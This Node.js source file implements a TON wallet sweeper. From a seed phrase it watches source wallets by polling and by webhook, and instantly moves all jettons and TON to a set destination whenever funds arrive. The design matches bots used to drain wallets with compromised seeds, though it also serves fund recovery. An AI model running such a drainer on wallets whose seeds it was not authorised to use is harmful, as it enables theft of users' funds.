require("dotenv").config();
const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const { TonClient, WalletContractV4, WalletContractV5R1, internal, Address, beginCell, toNano } = require("ton");
const { mnemonicToPrivateKey } = require("ton-crypto");

const SEED = process.env.SEED;
const SOURCES = [
  process.env.SOURCE_ADDR_NORMAL,
  process.env.SOURCE_ADDR_W5
].filter(Boolean);
const DEST = process.env.DEST_ADDR_NORMAL; // مقصد اصلی

const RPC = process.env.RPC_ENDPOINT || "https://toncenter.com/api/v2/jsonRPC";
const APP_PORT = Number(process.env.APP_PORT || 3000);

const TONAPI = "https://tonapi.io/v2";
const GECKO_TERMINAL = "https://api.geckoterminal.com/api/v2";

const PRICE_REFRESH_MS = Number(process.env.PRICE_REFRESH_MS || (3 * 60 * 60 * 1000)); // 3h
const POLL_MS = Number(process.env.POLL_MS || 1000); // 1s fallback polling
const MIN_TON_TRIGGER = Number(process.env.MIN_TON_TRIGGER || 0.004);
const EXTRA_FEE_SAFE = Number(process.env.EXTRA_FEE_SAFE || 0.010);
const ATTACH_PER_JETTON = process.env.ATTACH_PER_JETTON || "0.15";
const FORWARD_TON = process.env.FORWARD_TON || "0.05";

const WEBHOOK_PATH = process.env.WEBHOOK_PATH || "/ton-event";
const WEBHOOK_VERIFY_TOKEN = process.env.WEBHOOK_VERIFY_TOKEN || "";
const TONAPI_KEY = process.env.TONAPI_KEY || "";

const client = new TonClient({ endpoint: RPC });
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const log = (...a) => console.log(new Date().toISOString(), ...a);

// helpers
function buildJettonTransferBody({ amountAtomic, to, forwardTon }) {
  const OP = 0x0f8a7ea5;
  return beginCell()
    .storeUint(OP, 32).storeUint(0, 64)
    .storeCoins(amountAtomic)
    .storeAddress(Address.parse(to))
    .storeAddress(null).storeMaybeRef(null)
    .storeCoins(forwardTon || 0).storeMaybeRef(null)
    .endCell();
}

async function openWalletByAddr(pub, addrStr) {
  const addr = Address.parse(addrStr);
  try {
    const w5 = WalletContractV5R1.create({ publicKey: pub, workchain: addr.workChain });
    if (w5.address.toString() === addrStr) return client.open(w5);
  } catch (_) {}
  const w4 = WalletContractV4.create({ publicKey: pub, workchain: addr.workChain });
  return client.open(w4);
}

async function listJettons(ownerAddr) {
  try {
    const headers = TONAPI_KEY ? { Authorization: `Bearer ${TONAPI_KEY}` } : {};
    const { data } = await axios.get(`${TONAPI}/accounts/${ownerAddr}/jettons`, { headers, timeout: 7000 });
    const arr = data?.jettons || [];
    return arr.map(j => ({
      owner: ownerAddr,
      symbol: (j.jetton?.symbol || j.jetton?.name || "JETTON").toUpperCase(),
      balanceAtomic: BigInt(j.balance || "0"),
      walletAddr: j.wallet_address?.address,
      masterAddr: j.jetton?.address,
      decimals: j.jetton?.decimals ?? 9
    })).filter(x => x.balanceAtomic > 0n);
  } catch (e) {
    log("TonAPI listJettons error:", e?.response?.status || e.message);
    return [];
  }
}

async function priceUSDForMaster(masterAddr, symbol) {
  try {
    const url = `${GECKO_TERMINAL}/networks/ton/tokens/${masterAddr}/info`;
    const { data } = await axios.get(url, { timeout: 5000 });
    const p = data?.data?.attributes?.price_usd;
    if (p != null) return Number(p);
  } catch {}
  if (symbol === "USDT") return 1.0;
  return null;
}

function usdValueOf(j, price) {
  if (!price) return 0;
  const denom = Number(j.decimals ?? 9);
  const human = Number(j.balanceAtomic) / (10 ** denom);
  return human * price;
}

// priority cache
let priorityCache = new Map();
let lastPriceRefresh = 0;

async function refreshPrioritiesForOwner(ownerAddr) {
  const jets = await listJettons(ownerAddr);
  if (jets.length === 0) { priorityCache.set(ownerAddr, []); return; }

  const now = Date.now();
  const needPrice = now - lastPriceRefresh > PRICE_REFRESH_MS;

  const prices = new Map();
  for (const j of jets) {
    if (!needPrice && priorityCache.has(ownerAddr)) {
      const cached = priorityCache.get(ownerAddr).find(x => x.masterAddr === j.masterAddr);
      if (cached?.price) { prices.set(j.masterAddr, cached.price); continue; }
    }
    const p = await priceUSDForMaster(j.masterAddr, j.symbol);
    if (p != null) prices.set(j.masterAddr, p);
  }
  if (needPrice) lastPriceRefresh = now;

  const scored = jets.map(j => {
    const price = prices.get(j.masterAddr) ?? (j.symbol === "USDT" ? 1.0 : null);
    const usd = price ? usdValueOf(j, price) : 0;
    return { ...j, price, usd };
  }).sort((a, b) => b.usd - a.usd);

  priorityCache.set(ownerAddr, scored);
  log(`Priorities ${ownerAddr.slice(0,8)}… → ${scored.map(x=>`${x.symbol}:${x.usd.toFixed(2)}$`).join(" | ")}`);
}

async function ensurePrioritiesSnapshot() {
  await Promise.all(SOURCES.map(s => refreshPrioritiesForOwner(s)));
}
setInterval(() => { ensurePrioritiesSnapshot().catch(()=>{}); }, PRICE_REFRESH_MS);

// drain
async function drainSource(openedWallet, secretKey, srcAddrStr, currentTonBalance) {
  const ow = openedWallet;
  const balTON = currentTonBalance;
  if (balTON < MIN_TON_TRIGGER) return;

  let jets = priorityCache.get(srcAddrStr) || [];
  jets = jets.filter(j => j.balanceAtomic > 0n);

  const messages = [];
  let tonSpendForJets = 0;

  for (const j of jets) {
    const forwardTon = toNano(FORWARD_TON);
    const attached = toNano(ATTACH_PER_JETTON);
    const body = buildJettonTransferBody({
      amountAtomic: j.balanceAtomic,
      to: DEST,
      forwardTon
    });
    tonSpendForJets += Number(attached) / 1e9;
    messages.push(internal({
      to: j.walletAddr,
      value: attached.toString(),
      bounce: true,
      body
    }));
  }

  const seqno = await ow.getSeqno();
  let estFee = 0;
  if (messages.length > 0) {
    try {
      const est = await ow.estimateTransfer({ seqno, secretKey, messages });
      estFee = Number(est.source_fees.total_fees) / 1e9;
    } catch (e) {
      log(`[${srcAddrStr.slice(0,8)}] estimate jettons failed:`, e?.message || e);
    }
  }

  let remainTON = balTON - tonSpendForJets - estFee - EXTRA_FEE_SAFE;
  if (remainTON > 0.001) {
    messages.push(internal({
      to: DEST,
      value: toNano(remainTON.toFixed(9)).toString(),
      bounce: true
    }));
  }

  if (messages.length === 0) {
    try {
      const est = await ow.estimateTransfer({
        seqno,
        secretKey,
        messages: [ internal({ to: DEST, value: toNano(Math.max(balTON - 0.003,0).toFixed(9)).toString(), bounce: true }) ]
      });
    const fee = Number(est.source_fees.total_fees) / 1e9;
    const send = balTON - fee - 0.001;
    if (send > 0) {
      log(`[${srcAddrStr.slice(0,8)}] TON-only: ${send.toFixed(9)} TON`);
      await ow.sendTransfer({
        secretKey,
        messages: [ internal({ to: DEST, value: toNano(send.toFixed(9)).toString(), bounce: true }) ]
      });
    }
    } catch (e) {
      log(`[${srcAddrStr.slice(0,8)}] estimate TON-only failed:`, e?.message || e);
    }
    return;
  }

  log(`[${srcAddrStr.slice(0,8)}] batch: jets=${jets.length} ton_after=${Math.max(remainTON,0).toFixed(6)}`);
  await ow.sendTransfer({ secretKey, messages });
}

// app & workers
(async () => {
  if (!SEED || !SOURCES.length || !DEST) {
    console.error("Missing env vars. Check SEED, SOURCE_ADDR_* , DEST_ADDR_NORMAL");
    process.exit(1);
  }
  const { publicKey, secretKey } = await mnemonicToPrivateKey(SEED.split(" "));

  const opened = {};
  for (const addr of SOURCES) opened[addr] = await openWalletByAddr(publicKey, addr);

  await ensurePrioritiesSnapshot();

  const lastSeen = {};
  for (const a of SOURCES) lastSeen[a] = 0;

  (async function poller() {
    while (true) {
      try {
        for (const a of SOURCES) {
          const ow = opened[a];
          const addr = Address.parse(a);
          const balNano = await client.getBalance(addr);
          const balTON = Number(balNano) / 1e9;
          const arrival = balTON > (lastSeen[a] + 1e-9);
          lastSeen[a] = balTON;
          if (arrival || balTON >= MIN_TON_TRIGGER) {
            await drainSource(ow, secretKey, a, balTON);
            refreshPrioritiesForOwner(a).catch(()=>{});
          }
        }
      } catch (e) {
        log("POLL ERROR:", e?.response?.data || e.message || e);
      }
      await sleep(POLL_MS);
    }
  })();

  const app = express();
  app.use(bodyParser.json());
  app.get("/health", (_, res) => res.json({ ok: true, time: Date.now() }));

  app.post(WEBHOOK_PATH, async (req, res) => {
    try {
      if (WEBHOOK_VERIFY_TOKEN) {
        const token = req.headers["x-webhook-token"] || req.query.token;
        if (token !== WEBHOOK_VERIFY_TOKEN) return res.status(403).json({ ok: false });
      }
      const body = req.body || {};
      const involved = SOURCES.find(a => JSON.stringify(body).includes(a));
      if (!involved) return res.json({ ok: true, ignored: true });

      const addr = Address.parse(involved);
      const balNano = await client.getBalance(addr);
      const balTON = Number(balNano) / 1e9;

      await drainSource(opened[involved], secretKey, involved, balTON);
      refreshPrioritiesForOwner(involved).catch(()=>{});
      res.json({ ok: true });
    } catch (e) {
      log("WEBHOOK ERROR:", e?.message || e);
      res.status(500).json({ ok: false });
    }
  });

  app.listen(APP_PORT, () => log(`Listening on :${APP_PORT}${WEBHOOK_PATH}`));
})();
